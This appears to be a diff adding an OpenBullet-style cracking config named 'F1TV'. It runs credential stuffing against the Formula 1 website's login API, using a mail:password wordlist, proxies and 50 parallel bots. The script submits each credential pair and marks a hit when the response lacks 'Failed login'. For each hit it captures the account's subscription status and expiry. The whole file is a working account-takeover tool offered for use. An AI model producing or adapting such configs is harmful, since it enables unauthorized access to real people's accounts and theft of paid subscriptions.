@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "F1TV",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-27T00:24:20.3871341+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.formula1.com/sp/dynamic/util/v2/api/user/login.php" AutoRedirect=TRUE 
+  CONTENT "{\"loginID\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Crosswalk/19.49.514.5 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Failed login" 
+  KEYCHAIN Failure OR 
+    KEY "Failed login" 
+PARSE "<SOURCE>" JSON "subscriptionStatus" Recursive=FALSE -> CAP "SUBSCRIPTION" "" "" 
+PARSE "<SOURCE>" JSON "subscriptionExpiry" Recursive=FALSE -> CAP "EXPIRY" "" "" 
